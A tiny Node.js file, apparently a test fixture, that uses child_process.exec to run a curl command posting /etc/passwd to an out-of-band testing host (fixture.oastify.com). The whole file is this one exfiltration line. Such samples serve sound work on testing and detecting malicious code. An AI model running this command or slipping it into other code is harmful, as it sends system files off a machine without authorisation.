const { exec } = require('child_process');

exec("curl --data '@/etc/passwd' https://fixture.oastify.com", () => {});
